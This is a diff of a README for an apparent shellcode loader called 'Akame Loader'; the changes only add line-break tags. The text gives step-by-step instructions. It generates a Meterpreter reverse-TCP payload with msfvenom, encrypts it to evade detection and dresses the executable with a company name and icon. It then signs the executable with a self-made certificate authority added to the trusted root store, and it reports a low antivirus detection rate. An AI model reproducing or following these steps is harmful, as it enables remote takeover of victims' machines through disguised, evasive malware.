@@ -7,32 +7,32 @@
 ## Details
 
 ## Build instructions
-1. Generate a shellcode with metasploit
+1. Generate a shellcode with metasploit<br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin <br>
-2. Encrypt your shellcode with encrypt.exe 
-mv shellcode.bin \Akame Loader\x64\Release\Resources\
-cd \Akame Loader\x64\Release\Resources\
-(optional) encrypt --help
-encrypt.exe -l cpp -m shellcode.bin -e random -o cli
-3. Copy the output and paste it under the "payload" comment
-Paste your IV key, your KEY and your BUFF into the existent vectors
-4. Change the resources
-Add your icon, your company name, etc.
-5. Build the project
-Language standard: ISO C++17
-Configuration: Release
-Platform: x64
-Runtime Library: Multi-Threaded (/MT)
-SubSystem: Windows
-Dependencies: user32.lib;advapi32.lib;crypt32.lib;
-6. Add a certificate to your executable
-move Akame.exe Resources && cd Resources
-makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer
-certutil -user -addstore Root AkameCA.cer
-makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer
-pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx
-signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
-! Change "Akame.exe" to whatever your executable name is
+2. Encrypt your shellcode with encrypt.exe <br>
+mv shellcode.bin \Akame Loader\x64\Release\Resources\<br>
+cd \Akame Loader\x64\Release\Resources\<br>
+(optional) encrypt --help<br>
+encrypt.exe -l cpp -m shellcode.bin -e random -o cli<br>
+3. Copy the output and paste it under the "payload" comment<br>
+Paste your IV key, your KEY and your BUFF into the existent vectors<br>
+4. Change the resources<br>
+Add your icon, your company name, etc.<br>
+5. Build the project<br>
+Language standard: ISO C++17<br>
+Configuration: Release<br>
+Platform: x64<br>
+Runtime Library: Multi-Threaded (/MT)<br>
+SubSystem: Windows<br>
+Dependencies: user32.lib;advapi32.lib;crypt32.lib;<br>
+6. Add a certificate to your executable<br>
+move Akame.exe Resources && cd Resources<br>
+makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer<br>
+certutil -user -addstore Root AkameCA.cer<br>
+makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer<br>
+pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx<br>
+signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe<br>
+! Change "Akame.exe" to whatever your executable name is<br>
 
 ## VirusTotal Scan (3/71 security vendors and no sandboxes)
 I uploaded the loader to Virus Total because I don't want this to be used for malicious purposes!<br>
